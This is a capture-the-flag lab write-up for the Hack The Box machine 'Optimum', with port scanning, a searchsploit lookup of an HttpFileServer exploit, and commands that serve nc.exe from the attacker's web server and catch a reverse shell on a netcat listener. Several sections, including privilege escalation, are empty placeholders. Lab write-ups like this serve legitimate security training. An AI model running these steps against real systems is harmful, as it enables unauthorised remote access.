# Optimum 

**OS:** Windows

**Level:** Easy

**Links:** [1](https://www.hackthebox.com/machines/Optimum)  [2](https://app.hackthebox.com/machines/Optimum)

**Machine ip:** 10.10.10.8

![Optimum](https://github.com/h4md153v63n/CTFs/assets/5091265/f0fe7004-231f-495f-b3b2-8af6d4e6d81a)



## Reconnaissance
```
sudo masscan -p1-65535,U:1-65535 --rate=1000 10.10.10.8 -e tun0 > ports

ports=$(cat ports | awk -F " " '{print $4}' | awk -F "/" '{print $1}' | sort -n | tr '\n' ',' | sed 's/,$//')

sudo nmap -Pn -n -sV -sC -O -p$ports 10.10.10.8 --open
```

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/6bd17850-1383-4bb9-9363-f840a535bbc5)


## Enumeration
![image](https://github.com/h4md153v63n/CTFs/assets/5091265/7b8a57ae-f7cc-4fee-a4bb-d9d8ae1f2ddb)

```
searchsploit httpfileserver

searchsploit -m 39161
```

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/160c6e02-5cc4-4c84-aa44-b51481749738)

Change ip addres and port number:

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/fbbb8068-00c8-4bda-8ae5-9b062ae8d92a)

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/a62cd8b5-3931-4863-9e43-c9bd8ca44602)


## Exploitation & Gaining Access
```
# On the kali attack vm:
cp /usr/share/windows-binaries/nc.exe .

# On the kali attack vm - different terminal:
sudo python3 -m http.server 80

# On the kali attack vm - different terminal you will get the revershell:
nc -nlvp 4444

# On the kali attack vm - different terminal:
python3 39161.py 10.10.10.8 80

python3 39161.py 10.10.10.8 80

```

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/0b3ad525-c717-4f8c-a61c-6bf6381ab8f2)


## Privilege Escalation




# References & Alternatives
+ https://vvmlist.github.io/#Optimum
+ x


## CVE Scripting
+ x


## Tools
+ x


## Technical Knowledge
+ x


## Problems Solution
+ **SyntaxError: (unicode error) 'unicodeescape' codec can't decode bytes in position 2-3: truncated \UXXXXXXXX escape:**
  + https://youtu.be/rNmF991BSTE?t=40
  + https://www.geeksforgeeks.org/how-to-fix-syntaxerror-unicode-error-unicodeescape-codec-cant-decode-bytes/
  + https://community.alteryx.com/t5/Alteryx-Designer-Desktop-Discussions/Error-unicodeescape-codec-can-t-decode-bytes/td-p/427540
+ **SyntaxError: Missing parentheses in call to 'print'. Did you mean print(...)?:**
+ **ModuleNotFoundError: No module named 'urllib2':**
  + https://www.easytweaks.com/module-not-found-urllib2/
  + https://youtu.be/jfD_9DoWGlI?t=63
  + https://blog.finxter.com/fix-import-error-no-module-named-urllib2-python/
+ **ERROR: Could not find a version that satisfies the requirement urllib (from versions: none):**
  + https://github.com/ThomasTJdev/python_gdork_sqli/issues/1


## For More
- x
